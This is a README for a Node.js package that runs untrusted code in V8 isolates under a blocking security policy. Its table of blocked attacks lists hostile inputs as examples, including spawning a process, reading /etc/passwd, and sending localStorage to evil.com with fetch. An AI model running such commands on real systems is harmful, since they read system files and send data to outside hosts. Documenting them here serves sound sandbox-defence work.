# @aether/sandbox — V8 Isolate Sandbox with Fail-Closed Policy

> Code runs in a separate V8 heap. No host access, no module system, no escape —
> verified by dynamic exploit tests.

## The claim vs. the proof

```diff
 // ── BEFORE: plain eval (what competitors do) ─────────────────────────────
-function run(code) { return eval(code); }
+// ── AFTER: @aether/sandbox ──────────────────────────────────────────────────
+const { SandboxRuntime } = require('@aether/sandbox');
+const { SecurityPolicy } = require('@aether/sandbox/security');
+
+const policy = new SecurityPolicy({
+  blockNetwork: true, blockFilesystem: true, blockProcessSpawn: true,
+  maxExecTimeMs: 5000, maxMemoryMb: 64,
+});
+const runtime = new SandboxRuntime(policy);
+await runtime.init();
+
+// Host-side secret the sandbox must never reach:
+const HOST_SECRET = 'sk-live-abc123';
+
+const result = await runtime.execute({
+  code: "require('child_process').execSync('id').toString()",
+});
+console.log(result.ok);    // false — blocked
+console.log(result.error); // "Security policy violation: process spawn blocked"
```

**What the sandbox blocks:**

| Attack | Result |
|--------|--------|
| `require('child_process').execSync('id')` | ✗ blocked — no module system in isolate |
| `process.binding('spawn_sync')` | ✗ blocked — no native bindings |
| `require('fs').readFileSync('/etc/passwd')` | ✗ blocked — filesystem policy |
| `require('http').get('https://evil.com')` | ✗ blocked — static scan + no module system |
| `fetch('https://evil.com', {body: localStorage})` | ✗ blocked — network policy |

**Verification:** run `npx vitest run exploit-demonstration` — the test
dynamically executes hostile code in a real `isolated-vm` and asserts none of
the above escape. This is a *runtime* proof, not a grep.

## Standalone usage

```typescript
import { SandboxRuntime } from '@aether/sandbox';
import { SecurityPolicy } from '@aether/sandbox/security';

const policy = new SecurityPolicy({
  blockNetwork: true,       // blocks http/https/net/tls/dgram/dns
  blockFilesystem: true,    // blocks fs module + globalThis.__dirname hacks
  blockProcessSpawn: true,  // blocks child_process + process.binding
  maxExecTimeMs: 30_000,    // hard wall-clock limit
  maxMemoryMb: 128,         // per-isolate ceiling
  // Optional: module whitelist (defaults to a safe subset).
  // allowedModules: ['crypto', 'util', 'buffer', ...],
});

const runtime = new SandboxRuntime(policy);
await runtime.init();  // fails closed if isolated-vm native binding missing

const result = await runtime.execute({
  code: 'Array.from({length: 5}, (_, i) => i * 2).join(",")',
  timeout: 5_000,         // override for this call only
});

console.log(result.ok);        // true
console.log(result.output);    // "0,2,4,6,8"
console.log(result.durationMs); // actual wall time
```

## Security policy (static gate)

Before any code reaches the V8 Isolate, `SecurityPolicy.scanCode()` blocks
anything that imports or references a banned module. This is a *static* gate —
it runs before `isolated-vm` is even loaded, so CI without native bindings
still catches policy violations at parse time.

```typescript
const violation = policy.checkModule('child_process');
// → { type: 'process', detail: 'process module child_process blocked', blocked: true }
```

## CodeAct self-debug loop

```typescript
import { CodeActEngine } from '@aether/sandbox/codeact';

const engine = new CodeActEngine(runtime, { maxIters: 3 });
const result = await engine.run('Sort this array: [3,1,4,1,5]');
// CodeAct: generate → execute → observe → retry if wrong.
```

## API surface (subpath exports)

| Import path | What you get |
|---|---|
| `@aether/sandbox` | `SandboxRuntime`, `CodeActEngine`, `ExecutionRequest`, `ExecutionResult` |
| `@aether/sandbox/security` | `SecurityPolicy`, `PolicyConfig`, `PolicyViolation`, `EbpfFirewall` |

## Requirements

- Node.js ≥ 20
- `isolated-vm` native binding (C++ V8 isolate): installs via npm on macOS/Linux.
  On platforms where the prebuilt binary is unavailable, the sandbox refuses
  to start (fail-closed, not fail-open).
